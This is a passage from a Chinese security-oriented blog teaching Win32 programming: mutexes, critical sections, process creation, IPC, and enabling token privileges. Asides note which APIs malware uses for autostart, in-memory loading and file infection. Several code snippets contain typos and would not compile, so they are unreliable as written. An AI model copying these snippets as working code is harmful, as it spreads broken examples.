class="comment">//获取</span></span><br><span class="line"><span class="function">BOOL <span class="title">GetThreadContext</span><span class="params">(_In_ HANDLE hThread, _In_ CONTEXT* context)</span></span>;</span><br><span class="line"><span class="comment">//设置</span></span><br><span class="line"><span class="built_in">CONTEXTSetThreadContext</span>(_In_ HANDLE hThread, _In_ CONTEXT* context);</span><br><span class="line"><span class="comment">//临界区</span></span><br><span class="line"><span class="comment">//创建</span></span><br><span class="line">CRITICAL_SECTION cs;</span><br><span class="line"><span class="comment">//初始化</span></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">InitializeCriticalSection</span><span class="params">(&amp;cs)</span></span>;</span><br><span class="line"><span class="comment">//在线程中使⽤</span></span><br><span class="line"><span class="comment">//获取</span></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">EnterCriticalScetion</span><span class="params">(&amp;cs)</span></span>;</span><br><span class="line"><span class="comment">//释放</span></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">LeaveCriticalSection</span><span class="params">(&amp;cs)</span></span>;</span><br><span class="line"><span class="comment">//删除</span></span><br><span class="line"><span class="function">VOID WINAPI <span class="title">DeleteCriticalSection</span><span class="params">(cs)</span></span>;</span><br><span class="line"><span class="comment">//使⽤时可以为每⼀个全局变量单独创建⼀个锁,避免多个线程使⽤不同的有交叉的多个全局变量</span></span><br><span class="line">时造成死锁</span><br><span class="line">DWORD a; DWORD b; DWORD c;</span><br><span class="line">CRITICAL_SECTION ka; CRITICAL_SECTION kb; CRITICAL_SECTION kc;</span><br><span class="line"><span class="comment">//互斥体:可以跨进程进⾏线程控制 互斥体是内核对象</span></span><br><span class="line"><span class="comment">//创建 在同⼀个进程内使⽤可以不提供Nmae</span></span><br><span class="line">HANDLE gMutex = <span class="built_in">CreateMutex</span>(<span class="literal">nullptr</span>, FALSE, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="comment">//使⽤</span></span><br><span class="line">HANDLE gMutex = <span class="built_in">OpenMutex</span>(MUTEX_ALL_ACCESS, FALSE, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(HANDLE g_Mutex, DWORD timeOut);<span class="comment">//在互斥体没有被释放之前,</span></span><br><span class="line">只能等待,不能接着往下</span><br><span class="line"> <span class="comment">//释放</span></span><br><span class="line"><span class="built_in">ReleaseMutex</span>(HANDLE dMutex);</span><br></pre></td></tr></table></figure><p>以上是大致的线程操作。</p><h2 id="互斥体"><a href="#互斥体" class="headerlink" title="互斥体"></a>互斥体</h2><p>互斥体一般用于防止程序双开，我们这边看一个堵塞例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//创建⼀个互斥体</span></span><br><span class="line">    HANDLE g_hMutex = <span class="built_in">CreateMutex</span>(<span class="number">0</span>, FALSE, <span class="built_in">TEXT</span>(<span class="string">&quot;Z&quot;</span>)); <span class="comment">//TRUE 创建出来⽆信</span></span><br><span class="line">    号 FALSE 创建出来有信号</span><br><span class="line">        <span class="comment">//获取互斥体，等待令牌</span></span><br><span class="line">        <span class="built_in">WaitForSingleObject</span>(g_hMutex, INFINITE);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;A进程的X线程:%d \n&quot;</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//释放令牌</span></span><br><span class="line">    <span class="built_in">ReleaseMutex</span>(g_hMutex);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以使用 <a href="https://learn.microsoft.com/zh-cn/windows/win32/sync/mutex-objects">互斥对象</a> 来保护共享资源，防止多个线程或进程同时访问。 每个线程必须等待互斥体的所有权，然后才能执行访问共享资源的代码。 例如，如果多个线程共享对数据库的访问，则线程可以使用互斥对象一次只允许一个线程写入数据库.</p><p>这⾥两个例⼦是不可以同时进⾏打印的，因为他们有互斥体，运⾏会发现,如果没有得到令牌,程序是会堵塞住的,直到获取令牌。</p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Win32汇编讲解上（10）</title>
      <link href="/2023/05/09/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-10-Win32-%E6%B1%87%E7%BC%96%E8%AE%B2%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/"/>
      <url>/2023/05/09/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-10-Win32-%E6%B1%87%E7%BC%96%E8%AE%B2%E8%A7%A3%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Win32-API介绍"><a href="#1-Win32-API介绍" class="headerlink" title="1.Win32 API介绍"></a>1.Win32 API介绍</h1><p>这个内容在win 32汇编里面有。这个API就是函数。</p><p>这些API函数是封装起来的，在动态链接库中，对于API函数的调用就需要加载动态链接库【.dll】</p><p>API函数是开发win32应用程序的基础，即使使用MFC库来开发win32应用程序，也要对API函数有一定的了解。MFC封装了API函数，但并没有封装所有的API函数，比如发送消息函数：</p><p>SHBrowseForFolder</p><p>Win32 API的⼀些对系统，进程，线程，内存等操作的API上⾯与常⻅常⽤的⼀些windows api。</p><p>大概了解一下API</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Winodw</span><br><span class="line">GetClassName // 获取窗⼝类名</span><br><span class="line">SendMessage // 发送消息</span><br><span class="line">FindWindow // 查找窗⼝</span><br><span class="line">EnumWindows // 枚举所有窗⼝</span><br><span class="line">GetVersionEx // 获取系统版本</span><br><span class="line">GetSystemInfo // 获取硬件信息</span><br><span class="line">GetSystemDirectory // 获取系统⽬录</span><br><span class="line">GetWindowsDirectory // 获取Windows 安装⽬录</span><br><span class="line">GetUserName // 获取⽤户名</span><br><span class="line">GetComputerName // 获取计算机名</span><br><span class="line">SystemParametersInfo // 外设信息</span><br><span class="line">（时间函数经常会出现在某某试⽤软件中。）</span><br><span class="line">GetLocalTime // 获取本地时间</span><br><span class="line">SetLocalTime // 设置本地时间</span><br><span class="line">GetTickCount // 获取开机到现在的时间（毫秒）</span><br><span class="line">GetTickCount64 // 64位</span><br><span class="line">（病毒开机⾃启动会对注册表进⾏⼀些敏感操作就会调⽤这些API。）</span><br><span class="line">// 注册表</span><br><span class="line">RegCreateKey RegCreateKeyEx // 创建新项</span><br><span class="line">RegOpenKey RegOpenKeyEx // 打开⼀个项</span><br><span class="line">RegQueryValue RegQueryValueEx // 访问项的值</span><br><span class="line">RegDeleteKey RegDeleteKeyEx // 删除⼀个项</span><br><span class="line">RegCloseKey // 关闭句柄</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Memory</span><br><span class="line"> （病毒为了更好的隐藏⾃⼰，经常在内存加载运⾏。VirualAlloc再常⽤不过了。。。）</span><br><span class="line">VirtualAlloc // 开辟私有内存 (进程独有的内存空间) Private</span><br><span class="line">VirtualFree // 私有内存释放</span><br><span class="line">CreateFileMapping // 开辟物理⻚ 不与虚拟内存链接</span><br><span class="line">MapViewOfFile // 链接</span><br><span class="line">UnMapViewOfFile // 关闭⽂件资源</span><br><span class="line">FlushMapViewOfFile // 刷新缓冲区</span><br><span class="line">OpenFileMapping // 打开⼀个共享</span><br><span class="line">// 真正的开辟内存只有这两个函数，molloc new 在分配好的内存上 再分配 假分配</span><br></pre></td></tr></table></figure><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">⽂件系统</span><br><span class="line"> （感染形病毒经常对⽂件做操作哦）</span><br><span class="line">⼀、卷相关API</span><br><span class="line">GetLogicalDrives // 获取逻辑驱动器 获取卷</span><br><span class="line">GetLogicalDriveStrings // 获取所有盘符的字符串</span><br><span class="line">GetDriveType // 获取驱动器的类型</span><br><span class="line">GetVolumeInformation // 获取驱动器的信息</span><br><span class="line">⼆、⽬录相关 API</span><br><span class="line">CreateDirectory // 创建⽬录</span><br><span class="line">RemoveDirectory // 删除⽬录</span><br><span class="line">MoveFile // 修改⽬录名称</span><br><span class="line">SetCurrentDirectory // 设置当前⽬录所在位置</span><br><span class="line">GetCurrentDirectory // 获取当前⽬录名称</span><br><span class="line">三、⽂件相关 API</span><br><span class="line">CreateFile // 创建⼀个⽂件</span><br><span class="line">GetFileSize // 获取⽂件⼤⼩</span><br><span class="line">GetFileAttributesEx // 获取⽂件属性</span><br><span class="line">FileTimeToSystem // ⽂件时间 系统时间</span><br><span class="line">SetFilePointer // ⽂件索引位置</span><br><span class="line">ReadFile // 读取⽂件</span><br><span class="line">WriteFile // 写⼊⽂件</span><br><span class="line">CopyFile // 拷⻉⽂件</span><br><span class="line">DeleteFile // 删除⽂件</span><br><span class="line">FindFirstFile // 搜索第⼀个⽂件</span><br><span class="line">FindNextFile // 搜索下⼀个⽂件</span><br><span class="line">FindClose // 关闭查找句柄</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">环境变量</span><br><span class="line">GetEnvironmentStrings // 获取系统中的所有环境变量</span><br><span class="line">GetEnvironmentVarlable // 获取某⼀个环境变量</span><br><span class="line">SetEnvironmentVarlable // 增加、修改、删除某⼀个环境变量</span><br></pre></td></tr></table></figure><h1 id="2-进程，进程之间的通信，令牌，令牌环，UAC提权"><a href="#2-进程，进程之间的通信，令牌，令牌环，UAC提权" class="headerlink" title="2.进程，进程之间的通信，令牌，令牌环，UAC提权"></a>2.进程，进程之间的通信，令牌，令牌环，UAC提权</h1><h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p><strong>什么是进程</strong></p><p>进程是指系统中正在运行的一个应用程序，程序一旦运行，就是进程。进程是系统进行资源分配的独立实体，并且每一个进程拥有独立的地址空间。一个进程可以拥有多个线程，每一个线程使用其所属进程的<strong>栈</strong>空间。进行之间的通信 进程间通信IPC（管道，信号量，共享内存，消息队列）</p><p><strong>进程和线程的区别</strong></p><p>1.定义不一样，进程是执行中的一段程序，而一个进程中执行的每一个任务就是线程</p><p>2.一个线程只可以属于一个进程，但是一个进程能包含很多线程</p><p>3.线程无地址空间，它包括在进程的地址空间里面</p><p>4.线程的开销或代价比线程小</p><p>相当于，进程是一个容器，容器里面的线程才是真正做事情的。</p><p><strong>如何在WIN32中去操控进程呢？</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">OpenProcess<span class="comment">//打开进程</span></span><br><span class="line">CreateProcess<span class="comment">//创建进程</span></span><br><span class="line">WriteProcessMemory<span class="comment">//写进程中的数据</span></span><br><span class="line"><span class="built_in">ResumeThread</span>(pi.hThread);<span class="comment">//重新启动线程</span></span><br><span class="line">termilateprocess<span class="comment">//终止进程</span></span><br><span class="line">GetModuleFileName<span class="comment">//获取模块路劲</span></span><br><span class="line">GetCurrentDirectory<span class="comment">//获取工作路劲</span></span><br><span class="line">GetCurrentProcessId<span class="comment">//获取当前进程的id</span></span><br><span class="line">GetCurrentProcess<span class="comment">//获取当前进程句柄（伪句柄）</span></span><br><span class="line">GetCommandLine<span class="comment">//获取命令行</span></span><br><span class="line">GetStarupInfo<span class="comment">//获取启动信息</span></span><br><span class="line">EnumProcesses<span class="comment">//遍历进程id</span></span><br><span class="line">....</span><br></pre></td></tr></table></figure><p> 先看如何打开记事本，用API函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span><span class="comment">//windows 编程</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">STARTUPINFO si = &#123; <span class="built_in">sizeof</span>(STARTUPINFO) &#125;;<span class="comment">//在产生子进程的时候，子进程的窗口相关信息</span></span><br><span class="line">PROCESS_INFORMATION  pi;</span><br><span class="line">DWORD returnCode;<span class="comment">//用于保存子进程的返回值</span></span><br><span class="line"></span><br><span class="line"><span class="type">wchar_t</span> commandLine1[] = <span class="string">L&quot;notepad.exe&quot;</span>;<span class="comment">//测试命令行参数</span></span><br><span class="line"></span><br><span class="line">BOOL bRet = <span class="built_in">CreateProcess</span>(<span class="comment">//按下F1//调用失败，返回0；调用成功</span></span><br><span class="line"><span class="literal">NULL</span>,<span class="comment">//一般都是空</span></span><br><span class="line">commandLine1,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">FALSE,</span><br><span class="line">CREATE_NEW_CONSOLE,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">&amp;si,</span><br><span class="line">&amp;pi</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (bRet) &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;process is running&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="comment">//等待子程序进程结束</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(pi.hProcess, <span class="number">-1</span>);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;process is finished&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="comment">//获取子程序进程的返回值</span></span><br><span class="line"><span class="built_in">GetExitCodeProcess</span>(pi.hProcess, &amp;returnCode);</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Create return code:&quot;</span> &lt;&lt; returnCode&lt;&lt;std::endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;Create Process error!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(pi.hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(pi.hProcess);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在运行上面的C++的时候，我们可以看到记事本已经被执行了。打开notepad。这里主要靠CreateProcess这个函数API执行，当然如果只是打开程序的话也可以调用ShellExecute打开一个程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ShellExcute</span>(<span class="literal">NULL</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;EXE路劲&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,SW_SHOW);</span><br><span class="line"></span><br><span class="line">SHELLEXECUTEINFO ShExecInfo = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">ShExecInfo.cbSize = <span class="built_in">sizeof</span>(SHELLEXECUTEINFO);ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;</span><br><span class="line">ShExecInfo.hwnd = <span class="literal">NULL</span>;</span><br><span class="line">ShExecInfo.lpVerb = <span class="literal">NULL</span>;</span><br><span class="line">ShExecInfo.lpFile = strExe;</span><br><span class="line">ShExecInfo.lpParameters = sParams;</span><br><span class="line">ShExecInfo.lpDirectory = <span class="literal">NULL</span>;</span><br><span class="line">ShExecInfo.nShow = SW_HIDE:</span><br><span class="line">ShExecInfo.hInstApp = <span class="literal">NULL</span>;</span><br><span class="line">B00L ret = <span class="built_in">ShellExecuteEx</span>(&amp;ShExecInfo);</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(ShExecInfo.hProcess,INFINITE);</span><br></pre></td></tr></table></figure><h2 id="程序之间的通讯"><a href="#程序之间的通讯" class="headerlink" title="程序之间的通讯"></a>程序之间的通讯</h2><p>进程通讯方法非常之多，病毒和木马进程会和其他进程进行通讯。想办法获取信息，甚至有一些会基于系统层去拦截一些信息</p><p><strong>文件映射</strong></p><p>文件映射能使文件内容当作进程地址区间一块内存那样来对待，因此，进程不必使用文件I/O操作，只需要指针操作就可以读取和修改文件内容</p><p>Win32 API允许多个进程访问同一个文件映射对象，各个进程在它自己的地址空间接受内存的指针。通过使用这些指针，不同进制就可以读或修改文件的内容，实现了对文件中数据的共享。</p><p>应用程序有3种方法来使多个进程共享一个文件映射对象。</p><ol><li>继承：第一个进程建立文件映射对象，它的子进程继承改对象的句柄。</li><li>命名文件映射：第一个进程在建立文件映射对象的时候可以给该对象指定一个名字【可于文件名字不同】。第二个进程可通过这个名字打开次文件映射对象。另外，第一个进程也可以通过一些其他IPC机制【有名管道，邮件槽等..】把名字传给第二个进程</li><li>句柄复制：第一个进程建立文件映射对象，然后通过其他IPC鸡翅【有名管道，邮件槽等..】把对象句柄传递给第二个进程。第二个进程复制该句柄就取得对该文件映射对象的访问权限。</li></ol><p>文件映射在多个进程间共享数据的方法非常有效，有较好的安全性。但文件映射只能用于本地机器的进程之间，不用于网络，而开发者还必须控制进程间的同步。</p><p><strong>共享内存</strong></p><p>Win 32 API 中共享内存 实际就是文件映射的一种特殊情况。进程在创建文件映射对象时使用0xFFFFFFFF来代替文件句柄，就表示了对应的文件映射对象是从操作系统页面文件访问内存，其他进程打开文件映射对象就可以访问该内存快。由于共享内存是用文件映射时间的，所以它的安全性也good，也只能运行于同一个计算机上的进程之间</p><p><strong>匿名管道</strong></p><p>管道是一种具有两个端点的通信通道：有一端句柄的进程可以和另一端句柄的进程通信，管道可以是单向- 一端只能读，另一段只能写，也可以是双向的。</p><p>匿名管道是在父进程和子进程之间，或同一父进程的两个子进程之间传输数据的无名字的单向管道。通向由父进程创建管道，然后由要通信的子进程继承管道的读端点句柄或写断点句柄，然后实现通信。父进程还可以建立两个或者更多个继承匿名管道读和写句柄的子进程。这些子进程可以使用管道直接通讯，不需要通过父进程</p><p>匿名管道是单机上实现子进程标准I/O重定向的有效的方法，不能在网上使用，也不能用于两个不相关的进程之间</p><p><strong>命名管道</strong></p><p>命名管道(Named Pipe)是服务器进程和一个或多个客户进程之间通信的单向或双向管道。不同于匿名管道的是命名管道可以在不相关的进程之间和不同计算机之间使用，服务器建立命名管道时给它指定一个名字，任何进程都可以通过该名字打开管道的另一端，根据给定的权限和服务器进程通信。</p><p>命名管道提供了相对简单的编程接口，使通过网络传输数据并不比同一计算机上两进程之间通信更困难，不过如果要同时和多个进程通信它就力不从心了。</p><p><strong>邮件槽</strong></p><p>邮件槽(Mailslots)提 供进程间单向通信能力，任何进程都能建立邮件槽成为邮件槽服务器。其它进程，称为邮件槽客户，可以通过邮件槽的名字给邮件槽服务器进程发送消息。进来的消 息一直放在邮件槽中，直到服务器进程读取它为止。一个进程既可以是邮件槽服务器也可以是邮件槽客户，因此可建立多个邮件槽实现进程间的双向通信。</p><p>通过邮件槽可以给本地计算机上的邮件槽、其它计算机上的邮件槽或指定网络区域中所有计算机上有同样名字的邮件槽发送消息。广播通信的消息长度不能超过400字节，非广播消息的长度则受邮件槽服务器指定的最大消息长度的限制。</p><p>邮件槽与命名管道相似，不过它传输数据是通过不可靠的数据报(如TCP/IP协议中的UDP包)完成的，一旦网络发生错误则无法保证消息正确地接收，而命名管道传输数据则是建立在可靠连接基础上的。不过邮件槽有简化的编程接口和给指定网络区域内的所有计算机广播消息的能力，所以邮件槽不失为应用程序发送和接收消息的另一种选择。</p><p><strong>远程过程调用</strong></p><p>Win32 API提供的远程过程调用(RPC使应用程序可以使用玩程调用函数，这使在网络上用RPC进行进程通信就像函数调用那样简单RPC既可以在单机不同进程间使用也可以在网络中使用。</p><p>由于Win32 AP提供的RPC服从OSF-DCE(Open Software Foundation Distributed Computing Environment)标准。所以通过Win32 APl编写的RPC应用程序能与其它操作系统上支持DEC的RPC应用程序通信。使用RPC开发者可以建立高性能、紧密耦合的分布式应用程序。</p><p><strong>Sockets</strong></p><p>Windows Sockets规范是以U.C.Berkeley大学BSD UNIX中流行的Socket接口为范例定义的一套Windows下的网络编程接口。除了Berkeley Socket原有的库函数以外，还扩展了一组针对Windows的函数，使程序员可以充分利用Windows的消息机制进行编程。</p><p>现在通过Sockets实现进程通信的网络应用越来越多，这主要的原因是Sockets的跨平台性要比其它IPC机制好得多，另外WinSock2.0不仅支持TCP/IP协议，而且还支持其它协议(如IPX)。Sokets的唯一缺点是它支持的是底层通信操作，这使得在单机的进程间进行简单数据传递不太方便，这时使用下面将介绍的WM_COPYDATA消息将更合适些。</p><p><strong>WM_COPYDATA</strong>消息</p><p>WM COPYDATA是一种非常强大却鲜为人知的消息。当一个应用向另一个应用传送数据时，发送方只需使用调用SendMessage区数，参数是目的窗口的句柄、传递数据的起始地址、WM COPYDATA消息。接收方只需像处理其它消息那样处理WM_COPY DATA消息这样收发双方就实现了数据共享。</p><p>WM_COPYDATA是一种非常简单的方法，它在底层实际上是通过文件映射来实现的。它的缺点是灵活性不高，并且它只能用于Windows平台的单机环境下。</p><h2 id="进程的令牌"><a href="#进程的令牌" class="headerlink" title="进程的令牌"></a>进程的令牌</h2><p>这个主要是我们后期进程提权需要，譬如在杀死一个进程中需要提权用到令牌环。</p><p><strong>访问令牌</strong></p><p>访问令牌(Access Tokens)是Windows操作系统安全性的一个概念。</p><p>当用户登陆时，系统创建一个访问令牌，里面包含登录进程返回的SID和由本地安全策略分配给用户和用户的安全组的特权列表。</p><p>系统使用令牌控制用户可以访问哪些安全对象，并控制用户执行相关系统操作的能力</p><p>有两种令牌:主令牌和模拟令牌。</p><p>主令牌是由windows内核创建并分配给进程的默认访问令牌，每一个进程有一个主令牌，它描述了与当前进程相关的用户账户的安全上下文</p><p>如果用sysinternal工具logonsessions查看的话，这两个令牌属于不同的Logon Session.</p><p><strong>OpenProcessToken</strong></p><p>函数用来打开与进程相关联的访问令牌;</p><p>要对一个任意进程(包括系统安全进程和服务进程)进指定了写相关的访问权的OpenProcess操作，只要当前进程具有SeDeDebug权限就可以了。要是一个用户是Administrator或是被给予了相应的权限，就可以具有该权限。可是，就算我们用Administrator账号对一个系统安全进程执行OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessID)还是会遇到“访问拒绝”的错误。什么原因呢? 原来在默认的情况下进程的一些访问权限是没有被启用(Enabled)的，所以我们要做的首先是启用这些权限。与此相关的一些API函数有OpenProcessToken、LookupPrivilegevalue、AdjustTokenPrivileges。我们要修改一个进程的访问令牌，首先要获得进程访问令牌的句<br>柄，这可以通过OpenProcessToken得到，函数的原型如下:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">OpenProcessToken</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">__in HANDLE ProcessHandle,<span class="comment">//要修改访问权限的进程句柄</span></span></span></span><br><span class="line"><span class="params"><span class="function">__in DWORD DesiredAccess,<span class="comment">//指定你要进行的操作类型</span></span></span></span><br><span class="line"><span class="params"><span class="function">__out PHANDLE TokenHandle <span class="comment">//返回的访问令牌指针</span></span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>看看能关机的代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">BOOL fResult;</span><br><span class="line">TOKEN_PRIVILEGES tkp;</span><br><span class="line">HANDLE hToken;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(<span class="built_in">GetCurrentProcess</span>(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp; hToken))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken failed!&quot;</span>); <span class="comment">//获得进程句柄失败</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">LookupPrivilegeValue</span>(<span class="literal">NULL</span>,SE_SHUTDOWN_NAME, &amp; tkp.Privileges[<span class="number">0</span>].Luid); <span class="comment">//获得本地机唯一的标识</span></span><br><span class="line">tkp.PrivilegeCount = <span class="number">1</span>;</span><br><span class="line">tkp.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;</span><br><span class="line"><span class="built_in">AdjustTokenPrivileges</span>(hToken,FALSE, &amp; tkp,<span class="number">0</span>,(PTOKEN_PRIVILEGES)<span class="literal">NULL</span>,<span class="number">0</span>); <span class="comment">//调整获得的权限</span></span><br><span class="line"><span class="keyword">if</span> (<span 